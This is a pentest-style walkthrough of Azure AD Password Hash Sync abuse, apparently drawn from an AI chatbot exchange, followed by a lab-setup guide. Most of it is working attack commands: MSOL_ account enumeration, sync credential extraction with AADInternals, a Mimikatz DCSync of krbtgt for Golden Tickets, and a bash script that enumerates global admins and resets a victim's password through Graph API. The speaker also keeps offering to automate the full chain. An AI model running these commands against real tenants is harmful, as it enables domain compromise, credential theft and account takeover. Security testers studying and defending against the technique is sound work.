# Password Hash Sync Abuse

Azure AD Password Hash Sync (PHS) allows users to sign in to Azure using their **on-premises Active Directory credentials**. In a hybrid setup, this synchronization is handled by **Azure AD Connect**, typically via special **MSOL\_ accounts**. If attackers compromise the sync server or extract credentials tied to the sync process, they can abuse this trust to pivot into Azure and escalate privileges.

**🔎 Phase 1 – Enumerate Azure AD Connect Sync Accounts**

**🖥️ On-Premises (Active Directory):**

Get-ADUser -Filter "samAccountName -like 'MSOL\_\*'" -Properties \* \| Select SamAccountName, Description \| Format-List

- Identifies MSOL accounts used by Azure AD Connect.

- These are often highly privileged and used for sync operations.

**☁️ In Azure (AzureAD module):**

Import-Module .\AzureAD.psd1

Get-AzureADUser -All \$true \| Where-Object { \$\_.UserPrincipalName -match "Sync\_" }

- Finds hybrid sync accounts with elevated access in Azure AD.

**🧬 Phase 2 – Extract Sync Credentials**

**Using [AADInternals](https://github.com/Gerenios/AADInternals):**

Import-Module .\AADInternals.psd1

Get-AADIntSyncCredentials

- Extracts stored credentials or secrets used by the sync engine on the Azure AD Connect server.

**Pentest Tip:** This requires **local admin** or SYSTEM on the Azure AD Connect server.

**🎭 Phase 3 – *Abuse MSOL\_ Account with DCSync*\***

runas /netonly /user:\<DOMAIN\>\MSOL\_\<ID\> cmd

Invoke-Mimikatz -Command '"lsadump::dcsync /user:\<DOMAIN\>\krbtgt /domain:\<DOMAIN\> /dc:\<DC_NAME\>"'

- Leverages compromised sync credentials to perform **DCSync**.

- Extracts NTLM hashes for domain accounts (e.g., krbtgt) for **Golden Ticket** attacks.

**🔁 Phase 4 – Reset Passwords via Sync Account**

\$passwd = ConvertTo-SecureString '\<PASSWORD\>' -AsPlainText -Force

\$creds = New-Object PSCredential ("\<SYNC_USERNAME\>", \$passwd)

Get-AADIntAccessTokenForAADGraph -Credentials \$creds -SaveToCache

- Uses the sync credentials to authenticate against Azure Graph API.

\# Enumerate Global Admins

Get-AADIntGlobalAdmins

\# Get Immutable ID (on-prem object GUID)

Get-AADIntUser -UserPrincipalName \<user@domain.com\> \| Select ImmutableId

\# Reset password for synced user

Set-AADIntUserPassword -SourceAnchor "\<IMMUTABLE ID\>" -Password "\<NEW_PASSWORD\>" -Verbose

**🔓 Phase 5 – Reset Cloud-Only Account Passwords**

Get-AADIntUsers \| Where-Object { \$\_.DirSyncEnabled -ne "True" } \| Select UserPrincipalName, ObjectID

\# Reset password for cloud-only user

Set-AADIntUserPassword -CloudAnchor "\<OBJECT_ID\>" -Password "\<NEW_PASSWORD\>" -Verbose

**✅ Final Step – Access Azure Portal**

Once passwords are reset for synced or cloud-only users, log in to the [Azure Portal](https://portal.azure.com/) with the newly set credentials to gain interactive access.

**🛡️ Mitigations (Blue Team):**

- Restrict local access to Azure AD Connect servers.

- Rotate and monitor use of **MSOL accounts**.

- Enable **Azure AD Privileged Identity Management (PIM)**.

- Audit and restrict **password writeback** permissions.

- Use **Just-in-Time (JIT)** access and disable unused sync accounts.

Would you like a Python or PowerShell automation script that performs this full PHS abuse chain in a lab environment?

Here is an **Azure CLI-based script** that simulates **Password Hash Sync (PHS) abuse** steps during an Azure penetration test. It focuses on **enumerating users**, **finding synced accounts**, and **resetting passwords** — assuming the attacker already has valid token access (e.g., via token theft or abusing a sync account).

⚠️ **Preconditions**:

- You must be authenticated via a token/session (az login or az account get-access-token) using a compromised/synced account with Graph API write permissions (e.g., Directory Readers, Password Writers).

- This script uses REST API calls because az doesn’t natively support some of these operations.

**🛠️ Azure CLI Script for PHS Abuse Simulation**

\#!/bin/bash

\# Requires: jq, Azure CLI logged in as sync account or user with elevated Graph API access

\# Get Access Token

access_token=\$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)

\# 1. Enumerate Azure AD Users (filter synced accounts with DirSyncEnabled = true)

echo "\[\*\] Enumerating synced users..."

curl -s -X GET https://graph.microsoft.com/v1.0/users \\

-H "Authorization: Bearer \$access_token" \\

-H "Content-Type: application/json" \\

\| jq '.value\[\] \| select(.onPremisesSyncEnabled == true) \| {userPrincipalName, id, displayName}'

\# 2. Enumerate Global Admins

echo "\[\*\] Enumerating global administrators..."

curl -s -X GET "https://graph.microsoft.com/v1.0/directoryRoles" \\

-H "Authorization: Bearer \$access_token" \\

\| jq -r '.value\[\] \| select(.displayName == "Company Administrator") \| .id' \> global_admin_role_id.txt

admin_role_id=\$(cat global_admin_role_id.txt)

curl -s -X GET "https://graph.microsoft.com/v1.0/directoryRoles/\$admin_role_id/members" \\

-H "Authorization: Bearer \$access_token" \\

\| jq '.value\[\] \| {userPrincipalName, id, displayName}'

\# 3. Reset password for a user (you must know their objectId)

target_user_id="\<TARGET_USER_OBJECT_ID\>" \# Replace with target user ID

new_password="P@ssw0rd123!" \# Replace with desired new password

echo "\[\*\] Resetting password for \$target_user_id ..."

curl -s -X PATCH "https://graph.microsoft.com/v1.0/users/\$target_user_id" \\

-H "Authorization: Bearer \$access_token" \\

-H "Content-Type: application/json" \\

-d "{

\\passwordProfile\\: {

\\password\\: \\\$new_password\\,

\\forceChangePasswordNextSignIn\\: false

}

}"

echo "\[+\] Password reset attempted. Try logging in as the user via https://portal.azure.com"

**Summary of Actions**

| **Step** | **Action**                                                      |
|----------|-----------------------------------------------------------------|
| 1️⃣       | Enumerate synced accounts (via onPremisesSyncEnabled)           |
| 2️⃣       | Identify global administrators using directory role Graph calls |
| 3️⃣       | Reset the password of a selected user via PATCH request         |

**🔐 Notes:**

- You can use az ad user show --id \<user\> to manually inspect users if needed.

- Azure CLI lacks built-in support for directory role membership; hence raw Graph API calls are used.

- This assumes Directory.AccessAsUser.All or User.ReadWrite.All permissions on the token.

Would you like a full lab setup with simulated Azure AD Connect + synced users for testing this script safely?

Great — here’s how to set up a **safe, isolated Azure lab environment** to simulate **Azure AD Connect with Password Hash Sync** for penetration testing and security research.

**🧪 Azure PHS Abuse Testing Lab Setup (Step-by-Step)**

**⚙️ 1. Set Up On-Prem AD (Lab VM)**

- **Create a Windows Server 2022 VM** in Azure (or locally via Hyper-V).

- Install and configure **Active Directory Domain Services**:

- Install-WindowsFeature AD-Domain-Services

- Install-ADDSForest -DomainName "contoso.local"

- Create several test users (e.g., admin1, user1, service1, etc.).

**☁️ 2. Create Azure AD Tenant**

- Sign up for a new Azure tenant (Microsoft 365 Dev Program is free):

  - <https://developer.microsoft.com/en-us/microsoft-365/dev-program>

- Verify domain or use yourdomain.onmicrosoft.com.

- Add licenses (Microsoft 365 E5 trial or Azure AD P1/P2).

**🔄 3. Install & Configure Azure AD Connect**

On your Windows Server VM:

- Download [Azure AD Connect](https://www.microsoft.com/en-us/download/details.aspx?id=47594).

- During setup:

  - Choose **"Password Hash Synchronization"**

  - Use **custom install** to review configuration

  - Sync users from contoso.local to your Azure AD tenant

  - Confirm the creation of MSOL_XXXXX account in AD

**👥 4. Verify Sync**

In Azure CLI or Azure Portal:

az ad user list --query "\[?onPremisesSyncEnabled==\\true\\\].{UPN:userPrincipalName, Sync:onPremisesSyncEnabled}" -o table

**🛠️ 5. Set Up Testing Tools in Lab**

- Download and install these in the lab VM:

  - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

  - [AADInternals](https://github.com/Gerenios/AADInternals)

  - PowerShell 7

  - Azure CLI

- Optional: Add Kali Linux or Parrot OS VM to simulate attacker interaction.

**🔬 6. Test Abuse Scenarios**

With your lab in place, test:

- Enumeration of MSOL\_ accounts with Get-ADUser

- Credential extraction with AADInternals:

- Get-AADIntSyncCredentials

- Run DCSync from a compromised sync context (Mimikatz)

- Password reset attacks via Azure CLI or Graph API

- Logging in to [https://portal.azure.com](https://portal.azure.com/) with newly set passwords

Would you like a downloadable Terraform or Bicep deployment template to spin up this lab automatically in Azure?
